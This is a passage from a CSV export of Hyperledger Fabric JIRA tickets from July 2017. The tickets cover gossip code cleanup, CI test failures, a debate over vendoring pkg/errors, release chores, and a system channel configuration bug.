",,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9vj:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jul/17 2:30 AM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11973/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Simplify logic of gossip Peers() implementation.,FAB-5499,19525,,Story,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,C0rWin,C0rWin,C0rWin,27/Jul/17 9:27 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,30/Jul/17 7:45 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,"Currently logic which implements {{Peers}} API of gossip implemented as following:

{code}
// GetPeers returns a mapping of endpoint --> []discovery.NetworkMember
func (g *gossipServiceImpl) Peers() []discovery.NetworkMember {
	s := []discovery.NetworkMember{}
	for _, member := range g.disc.GetMembership() {
		s = append(s, member)
	}
	return s
}
{code}

While there is no real need to iterate and build new slice, since function could simply delegate call to the discovery instance namely to {{Getmembership}}, therefore function will become 

{code}
// GetPeers returns a mapping of endpoint --> []discovery.NetworkMember
func (g *gossipServiceImpl) Peers() []discovery.NetworkMember {
	return g.disc.GetMembership()
}
{code}",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-290,,,,,,,,,"1|hzy9vr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jul/17 10:41 PM;C0rWin;https://gerrit.hyperledger.org/r/#/c/11979/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update 1.0.1 version in release test suite,FAB-5500,19527,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,27/Jul/17 9:28 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Aug/17 11:00 PM,v1.0.0-rc1,,,v1.0.1,,fabric-build,,,,,,0,,,,,,,update version reference to 1.0.1 in release test suite.,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9vz:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Aug/17 10:46 PM;rameshthoomu;Submitted patch and it's in review https://gerrit.hyperledger.org/r/#/c/11975/;;;","11/Aug/17 11:00 PM;rameshthoomu;now release test job triggers tests on 1.0.1 release version.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
node SDK entry page in RTD has formatting issues,FAB-5502,19530,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,,jimthematrix,jimthematrix,27/Jul/17 11:03 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Nov/17 9:05 PM,,,,,,fabric-docs,,,,,,0,,,,,,,https://fabric-sdk-node.readthedocs.io/en/master/#features-of-the-sdk-for-nodejs,,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9wf:",,,,,,,,,,,,,,,,,,,,,,,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Oct/17 4:10 AM;markparz;[~jimthematrix] I think this is resolved with the new links to the SDKs, would you agree this could be closed? http://hyperledger-fabric.readthedocs.io/en/latest/fabric-sdks.html?highlight=sdk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TestLeaderYield CI failure,FAB-5503,19531,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,27/Jul/17 11:41 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Nov/17 9:27 PM,,,,v1.1.1,,fabric-gossip,,,,,,0,active,gossip,,,,,"{code}
02:39:31 unit-tests_1  | --- FAIL: TestLeaderYield (45.01s)
02:39:31 unit-tests_1  | 	integration_test.go:129: p0 started its delivery service
02:39:31 unit-tests_1  | 	assertions.go:225: 
                        
	Error Trace:	integration_test.go:115
02:39:31 unit-tests_1  | 		
			integration_test.go:131
02:39:31 unit-tests_1  | 		
	Error:		Should be false
02:39:31 unit-tests_1  | 		
02:39:31 unit-tests_1  | 	integration_test.go:134: p0 stopped its delivery service
02:39:31 unit-tests_1  | 	integration_test.go:139: p1 started its delivery service
02:39:31 unit-tests_1  | 	assertions.go:225: 
                        
	Error Trace:	integration_test.go:141
02:39:31 unit-tests_1  | 		
	Error:		Not equal: 1 (expected)
02:39:31 unit-tests_1  | 			        != -1 (actual)
02:39:31 unit-tests_1  | 		
02:39:31 unit-tests_1  | 2017-07-27 02:39:30.308 UTC [gossip/service] configUpdated -> ERRO 0e9 Tried joining channel A but our org( OrgMSP0 ), isn't among the orgs of the channel: [Org0] , aborting.
02:39:31 unit-tests_1  | FAIL
02:39:31 unit-tests_1  | coverage: 88.0% of statements
02:39:31 unit-tests_1  | FAIL	github.com/hyperledger/fabric/gossip/service	130.297s
02:39:31 unit-tests_1  | error: exit status 1
02:39:31 unit-tests_1  | panic: EOF
02:39:31 unit-tests_1  | 
02:39:31 unit-tests_1  | goroutine 1 [running]:
02:39:31 unit-tests_1  | panic(0x11ae00, 0xc42000a0f0)
02:39:31 unit-tests_1  | 	/opt/go/src/runtime/panic.go:500 +0x408
02:39:31 unit-tests_1  | main.main()
02:39:31 unit-tests_1  | 	/opt/gotools/obj/gopath/src/github.com/AlekSi/gocov-xml/gocov-xml.go:60 +0x13a
02:39:31 unittest_unit-tests_1 exited with code 2
{code}

https://jenkins.hyperledger.org/job/fabric-verify-z/10233/console",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-290,,,,,,,,,"1|hzy9wn:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jul/17 5:07 PM;yacovm;https://gerrit.hyperledger.org/r/#/c/12043/;;;","06/Aug/17 8:57 PM;yacovm;Looks like the commit above didn't fix it.;;;","08/Aug/17 6:26 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/12237/ 
disabling first to not interfere with CI;;;","14/Aug/17 8:54 PM;yacovm;https://gerrit.hyperledger.org/r/#/c/12419/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Vendor github.com/pkg/errors,FAB-5504,19534,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,28/Jul/17 12:01 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,03/Aug/17 3:39 AM,v1.0.0,,,v1.1.1,,fabric-orderer,,,,,,5,serviceability,,,,,,"This issue was originally created as a sub-task for some orderer work around improving serviceability.

Doing some reading on the internet around best practices for handling errors in Go, I found this article:

  https://dave.cheney.net/2016/04/27/dont-just-check-errors-handle-them-gracefully

and thought that using the https://github.com/pkg/errors package sounded like a good idea within the orderer.  I submitted a CR to vendor this package, but [~yacovm] pointed out that this duplicates the error handling already created in {{fabric/common/errors}}.  Some discussion ensued with [~C0rWin] and [~kchristidis] on Gerrit via:

  https://gerrit.hyperledger.org/r/#/c/11981/

On rocketchat.  [~wlahti] indicated that he and Gabor were unaware of this package during the implementation of {{fabric/common/errors}} and sees that the existing error framework could be reworked on top of it but did not have a strong preference for picking up the package or not.

Per suggestion from [~C0rWin] I'm adding this review-needed tag to this issue so that the maintainers can weigh in on whether we should bring in this package or not.  Although I welcome discussion below, a quick summary from existing discussions:

Pros of including this package:
1. We do not have to maintain it
2. It's a popular package other developers already know and understand
3. Eschewing a standard package in favor of duplicating its function on our own smells a bit of ""Not Invented Here"" syndrome and might be off-putting to potential contributors

Cons of including this package:
1. We already have an implementation which does not require it
2. We have more control over our own implementation for features which might not mesh with the standard package

Full disclosure: My personal preference is to move to this package, so my pro/con statements may be a little skewed.",,ChristopherFerris,jyellick,mastersingh24,muralisr,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9wv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,jyellick,mastersingh24,muralisr,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Aug/17 1:47 AM;yacovm;I think that if we have something that is starred 2K times and has 100 forks and written by Dave Cheney, we might want to consider using that and possibly extending it if we need.;;;","02/Aug/17 10:30 PM;mastersingh24;Since we really have not started down the path of using the fabric errors package, now is a good time to make this change.  +1;;;","03/Aug/17 12:06 AM;muralisr;As long as it allows for some of the fundamental goals (e.g., stack traces for quick debugging ... and controlling them), +1. ;;;","03/Aug/17 3:22 AM;ChristopherFerris;This has achieved the 5 maintiner votes needed. Go for it [~jyellick];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE event timeout option,FAB-5505,19535,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,28/Jul/17 2:24 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:13 PM,,,,,,fabric-quality,,,,,,0,,,,,,,"PTE event timeout option support.  Add the following to user input json

""eventOpt"": \{
    ""timeout"": ""2400000""
 },

If the option ""timeout"" is not present in the json, use 120000 as default.

Note that timeout unit is ms.

 ",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy9x3:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
GetHistoryForKey() is not implemented in shim.MockStub,FAB-5507,19537,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,nickmelis,nickmelis,28/Jul/17 4:38 AM,23/Jan/20 6:57 AM,28/Oct/23 3:00 AM,23/Jan/20 6:57 AM,v1.0.0,,,,,fabric-ledger,,,,,,0,chaincode,stale-item,,,,,"It is currently not possible to create unit tests for chaincode functions calling GetHistoryForKey().

 ",,nickmelis,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9xb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,nickmelis,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jul/17 4:39 AM;nickmelis;Feel free to close if this is already in the roadmap.;;;","23/Jan/20 6:57 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
create bootstap-1.0.1.sh script to download docker images and binaries,FAB-5509,19539,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,28/Jul/17 4:51 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Aug/17 10:45 PM,v1.0.0-rc1,,,v1.0.1,,fabric-build,,,,,,0,,,,,,,Create *bootstap-1.0.1.sh* script to download docker images and binaries of 1.0.1 release.,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9xr:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Aug/17 10:45 PM;rameshthoomu;Patch has been submitted and merged.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chain Code versioning,FAB-5513,19550,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,mahendranmahesh,mahendranmahesh,28/Jul/17 8:32 PM,23/Jan/20 6:57 AM,28/Oct/23 3:00 AM,23/Jan/20 6:57 AM,,,,,,,,,,,,0,stale-item,,,,,,"Firstly, We yet to evaluate Hyperledger v1.0

Before that, in the v0.6, any version changes to the golang chain-code generates the new chain-code id and creates an another network ledger.

Due to that, our application querying on the ledger, couldn't find the references of the existing data in new ledger.

Don't know, how to handle these versioning of chain-code.

Is there any provision to append the older data to the new ledger/ to the underlying DB to query?

 

Thanks,

Mahendran..",,mahendranmahesh,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy9z3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mahendranmahesh,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:57 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[IBMBlockchain v/s Hyperledger Release] chaincode spinoff requires image name as baseos,FAB-5517,19556,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rhegde,rhegde,29/Jul/17 12:35 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Aug/17 6:11 AM,,,,Not a Bug,WON'T FIX,,,,,,,0,,,,,,,"IBMBlockChain provides ibmblockchain/fabric-baseimage:0.3.1 whereas the peer need ibmblockchain/fabric-baseos:0.3.1

docker tag ibmblockchain/fabric-baseimage:0.3.1 ibmblockchain/fabric-baseos:0.3.1",,mastersingh24,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9zz:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Aug/17 6:11 AM;mastersingh24;I'm closing this here as this is not Hyperledger Fabric related.

But [https://hub.docker.com/r/ibmblockchain/fabric-baseos/tags/] does exist;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cleanup configtxgen related code from configtx package.,FAB-5518,19557,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,29/Jul/17 12:37 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,30/Jan/18 12:15 AM,,,,v1.1.1,,fabric-tools,,,,,,0,quality,,,,,,"The configtxgen code got slapped onto configtx and required some modifications within configtx.  This is really the wrong place for that work and it pollutes production path code, it should be removed.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya07:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[CI] - Create verify and merge jobs to exuecute byfn tests on fabric-samples repo,FAB-5519,19558,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,29/Jul/17 12:45 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Aug/17 10:51 PM,v1.0.0-rc1,,,v1.1.1,,,,,,,,0,build-system,,,,,,"Create Verify and Merge jobs to execute byfn tests on fabric-samples repository.

fabric-byfn-verify

fabric-byfn-merge

on above jobs, for every patch set execute tests (both custom channel and default channel)",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya0f:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Aug/17 10:52 PM;rameshthoomu;Patch set has been submitted & merged. Now after every patch set submitted to fabric-samples repository, CI triggers verify job which runs byfn tests with custom and default channel and same thing applies to merge job.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release Hyperledger Fabric v1.0.1,FAB-5520,19559,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,29/Jul/17 1:16 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Aug/17 8:12 PM,,,,v1.0.1,,fabric-release,,,,,,0,,,,,,,"*MUST BE REBASED JUST BEFORE MERGING*

Check for clean CI passes

Update Makefile

{{BASE_VERSION = 1.0.1}}
{{PREV_VERSION = 1.0.0}}
{{IS_RELEASE = true}}

{{release_notes/v1.0.1.txt should be updated}}

{{docs/source/releases.rst should be updated with prose and link to GH release page}}

{{change log should be generated just *after* *rebasing* to pick up the last minute merged CRs and linked from docs/source/releases.rst}}",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5532,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya0n:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/golang.org/x/crypto-0.1.0,dependabot/go_modules/test/performance/golang.org/x/net-0.7.0,release-1.0,dependabot/go_modules/golang.org/x/net-0.7.0,main,dependabot/go_modules/github.com/prometheus/client_golang-1.11.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve policy logging,FAB-5522,19561,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,29/Jul/17 3:23 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,30/Jan/18 12:15 AM,,,,,,fabric-orderer,,,,,,0,common-components,,,,,,"The configtx processing looks up policies by relative name, which triggers finding the right policy manager, then querying the relative name.  The problem with this however, is that the logs only show the relative name, which can make debugging challenging.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya13:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move configtxgen to fabric/common/tools,FAB-5524,19563,19557,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,29/Jul/17 5:09 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Aug/17 5:38 AM,,,,v1.1.1,,fabric-tools,,,,,,0,configtxgen,,,,,,"When configtxgen came to be, it was originally a quickie one-off to allow the SDK teams to generate the bytes of a channel creation transaction, and it was thrown into {{fabric/common/configtx/tool}}.  As {{configtxgen}} has gained sophistication and become a required tool for v1, it no longer makes sense in this path.  It should be moved to {{fabric/common/tools}} like the other utils ({{configtxlator}} and {{cryptogen}}",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya1j:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
System Channel update fails,FAB-5525,19565,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,jyellick,varadatibm,varadatibm,29/Jul/17 5:23 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jul/17 8:56 PM,v1.0.0,,,v1.0.1,,fabric-orderer,,,,,,0,HSBN,,,,,,"We try to update the system channel by adding additional admin cert. It fails.

The issue seems to be we update the certs for ""PeerOrg1"" and submit it as ""PeerOrg1"", but we get this message where it is looking for ""PeerOrg3"" to sign.

---

[36m2017-07-28 14:23:48.619 UTC [cauthdsl] func2 -> DEBU 8f3[0m 0xc42023e250 identity 0 does not satisfy principal: The identity is a member of a different MSP (expected PeerOrg3, got PeerOrg1)",,jyellick,kchristidis,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya1r:",,,,,,,,,,,,,,,,,,,,,,,jyellick,kchristidis,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jul/17 5:25 AM;jyellick;Found the underlying cause and pushed a fix via: https://gerrit.hyperledger.org/r/#/c/12029/

Thanks [~varadatibm] for putting the configtx code through its paces and catching these bugs!;;;","31/Jul/17 12:22 AM;kchristidis;Looks like this can go in on 1.0.1, updated JIRA accordingly.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The doc needs to tell people to specify their env when reporting problems,FAB-5526,19567,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,lehors,lehors,lehors,29/Jul/17 6:44 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,28/Aug/17 8:47 PM,v1.0.0,,,v1.0.2,,fabric-docs,,,,,,0,Documentation,,,,,,"We keep getting questions from users who report problems without providing basic information on the environment in which they are experiencing these problems.

The documentation section on ""Still have questions?"" pointing people to different places where they can ask further questions ought to instruct them to provide that information.

 ",,lehors,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya27:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,lehors,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Occasional UT failures orderer/concensus/kafka,FAB-5527,19568,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sanchezl,sanchezl,sanchezl,29/Jul/17 11:58 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,04/Aug/17 12:25 AM,v1.0.0,,,v1.1.1,,fabric-orderer,,,,,,0,kafka,,,,,,"Unit tests from the `kafka` package seem to fail in CI occasionally.

[https://jenkins.hyperledger.org/job/fabric-verify-z/10232/console] 
{code:java}
[orderer/kafka] Halt -> CRIT 006 [channel: 0x80a39aa0}.channel] Halting of chain requested
[orderer/kafka] processMessagesToBlocks -> CRIT 007 [channel: 0x80a39aa0}.channel] Unable to unmarshal consumed message = proto: can't skip unknown wire type 7 for orderer.KafkaMessage
[orderer/kafka] processMessagesToBlocks -> ERRO 008 [channel: 0x80a39aa0}.channel] Error during consumption: <nil>
[orderer/kafka] processMessagesToBlocks -> ERRO 009 [channel: 0x80a39aa0}.channel] Error during consumption: <nil>
panic: send on closed channel{code}
{{}}{{  }}",,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,FAB-4537,FAB-5539,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya2f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ability to utilize CouchDB views for aggregates and simple analytics on chain,FAB-5528,19570,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,josejuanmontiel,denyeart,denyeart,29/Jul/17 9:36 PM,26/Sep/19 2:44 PM,28/Oct/23 3:00 AM,29/Aug/19 3:34 AM,,,,Future,,fabric-ledger,,,,,,10,,,,,,,CouchDB 'views' can be used to calculate things like aggregates of on-chain data. Need the ability to create CouchDB views and query for simple on-chain analytics.,,akdj,antitoine,denyeart,DrVadson,jambonrose,joaquimpedrooliveira,josejuanmontiel,majkowski,petans24,sandp125,ssaddem,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16452,,,,,,,,,,,,,,,,,,,,,"15/Jul/19 1:59 AM;josejuanmontiel;image-2019-07-14-18-59-44-846.png;https://jira.hyperledger.org/secure/attachment/17600/image-2019-07-14-18-59-44-846.png","15/Jul/19 2:00 AM;josejuanmontiel;image-2019-07-14-19-00-53-731.png;https://jira.hyperledger.org/secure/attachment/17601/image-2019-07-14-19-00-53-731.png",,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya2v:",,,,Yes,,,,,,,,Unset,,,,,,,,,,,akdj,antitoine,denyeart,DrVadson,jambonrose,joaquimpedrooliveira,josejuanmontiel,majkowski,petans24,sandp125,ssaddem,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Jul/17 